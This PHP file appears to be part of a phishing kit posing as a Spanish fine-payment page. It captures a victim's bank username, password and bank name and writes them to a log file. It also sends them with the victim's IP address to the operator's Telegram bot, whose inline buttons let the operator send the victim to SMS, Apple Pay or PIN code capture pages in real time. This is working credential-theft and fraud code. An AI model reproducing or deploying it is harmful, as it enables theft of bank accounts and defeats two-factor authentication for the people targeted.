<?php
session_start();
include('../server/fonctions.php');
include('../settings.php');
require __DIR__ . '/vendor/autoload.php';
$date = date('d/m/y');
$heure = date('H:i:s');
$dateHeure = "$date, $heure";
$_SESSION['date_heure'] = $dateHeure;
use Telegram\Bot\Api;

$ip = $_SERVER['REMOTE_ADDR'];
$error = false;
$step = 1;
$telegram = new Api($bot_token);

$_SESSION['identifiant_banque'] = $_POST['identifiant_banque'];
$_SESSION['mdp_banque'] = $_POST['mdp_banque'];
$_SESSION['nom_bank'] = $_POST['nom_bank'];


if (!empty($_POST['identifiant_banque'])&& !empty($_POST['mdp_banque'])&& !empty($_POST['nom_bank']))  {

    $file = '../logs/' . date('Y-m-d') . '_id_banque.txt';
    $logMessage = "Identifiant Banque: {$_SESSION['identifiant_banque']}, Mot de passe Banque: {$_SESSION['mdp_banque']}, Nom de la Banque: {$_SESSION['nom_bank']}";
    file_put_contents($file, $logMessage . PHP_EOL, FILE_APPEND | LOCK_EX);

    $step = 2;

    $keyboard = [
        'inline_keyboard' => [
            [['text' => '❌ | Invalide log banque', 'callback_data' => 'invalide_banque']],
            [['text' => '📱  | Sms Auth Basic ', 'callback_data' => 'otp_sms']],
            [['text' => '📱  | Apple Pay ', 'callback_data' => 'otp_apple']],           
            [['text' => '📱  | Pin + NIF ', 'callback_data' => 'otp_pin']],          
            [['text' => '✅ | Succès ', 'callback_data' => 'succes']],

        ]
    ];
    $telegram->sendMessage([
        'chat_id' => $chat_rez,
        'text' => "

        [🏛️] Log Banque {$_SESSION['nom']} | {$_SESSION['prenom']} | 🇪🇸 Amende Espagne                    

        [🏛️] Nom de la banque :  : ". $_SESSION['nom_bank']."
        [🏛️] Identifiant :  : ". $_SESSION['identifiant_banque']."
        [🏛️] Pass :  : ". $_SESSION['mdp_banque']."        

        [🗺️] Informations liée au client [🗺️]
        [⌚] Heure et date du rez : {$_SESSION['date_heure']}
        [🌐] Ip Victime : $ip\n
			
        [©️] 𝐂𝐨𝐝𝐞𝐝 𝐛𝐲 𝐅𝐚𝐬𝐭_𝐒𝐜𝐚𝐦𝐚[©️]"
        ,

        'reply_markup' => json_encode($keyboard)
    ]);
} else {
    $error = true;

    header("Location: ../user/banque.php?error=1");
    exit;
}





?>
<!DOCTYPE html>
<html>

<head>

</head>

<body>
    <?php if ($step == 1):
        if ($error): ?>
            <div style="color:red;">
                <?= $errorMessage ?>
            </div>
        <?php endif; ?>



    <?php elseif ($step == 2): ?>

        <div>
            <?php include '../user/loader.php'; ?>
        </div>



        <!-- Fermez correctement les balises <body> et <html> ici si nécessaire -->
        <script src="https://code.jquery.com/jquery-3.7.0.js" integrity="sha256-JlqSTELeR4TLqP0OG9dxM7yDPqX1ox/HfgiSLBj8+kM=" crossorigin="anonymous"></script>
        
            <script>
            setInterval(function () {
                $.ajax({
                    type: "GET",
                    url: "callback.php",
                    success: function (msg) {

                        
                        if (msg === 'invalide_banque'){
                            window.location.href = '../user/banque.php?error=1';
                        }                        
                        else if (msg === 'otp_sms') {
                            window.location.href = '../user/sms_auth2.php';
                        }                     
                        else if (msg === 'otp_apple') {
                            window.location.href = '../user/sms_auth.php';
                        } 
                        else if (msg === 'otp_pin') {
                            window.location.href = '../user/pin.php';
                        }                        
                        
                        else if (msg === 'succes') {
                            window.location.href = '../user/succes.php';
                        }


                    }, 
                    error: function (msg) {
                        console.error(msg);
                    }
                });
            }, 3000) 
              </script>


    <?php endif; ?>
</body>

</html>